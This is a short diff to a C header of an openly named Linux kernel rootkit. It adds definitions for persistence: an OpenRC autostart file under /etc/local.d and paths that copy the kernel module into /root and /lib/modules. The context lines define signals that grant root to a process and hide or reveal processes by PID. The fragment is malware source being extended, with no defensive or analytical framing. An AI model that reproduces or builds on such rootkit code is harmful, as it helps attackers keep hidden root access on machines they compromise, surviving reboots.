@@ -17,6 +17,12 @@ extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/director
 
 #define MOD_ALIAS ".rootkit" /* Module alias (to check if rootkit is already loaded) */
 
+#define LOCALD_FILE "/etc/local.d/rootkit_load.start" /* Autostart file (OpenRC `local` service) */
+#define LOCALD_SIZE 256
+
+#define MOD_FILE "/root/%s.ko"            /* Module file in /root/ */
+#define MOD_COPY "/lib/modules/%s_mod.ko" /* Module file in /lib/modules/ (copied) */
+
 #define SIGROOT    42 /* Elevate the current process to root */
 #define SIGHIDE    43 /* Hide the process with the given PID */
 #define SIGSHOW    44 /* Show the process with the given PID */
